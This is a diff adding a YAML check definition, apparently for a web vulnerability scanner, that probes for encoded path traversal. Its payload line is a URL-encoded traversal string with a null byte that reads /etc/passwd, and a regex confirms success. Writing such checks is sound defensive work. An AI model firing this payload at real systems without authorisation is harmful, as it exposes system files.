@@ -1,0 +1,15 @@
+id: "PATH-TRAVERSAL-ENCODED-PASSWD"
+name: "Encoded path traversal exposure"
+tech_stack: []
+severity: high
+cvss: 7.5
+payload: "/..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"
+request_method: GET
+verify:
+  match_type: BodyRegex
+  response_codes: [200]
+  body_regex: "root:.*:0:0:"
+cve_id: null
+remediation: "Decode input before validation, reject null bytes, and block traversal after canonicalization."
+references:
+  - "https://owasp.org/www-community/attacks/Path_Traversal"
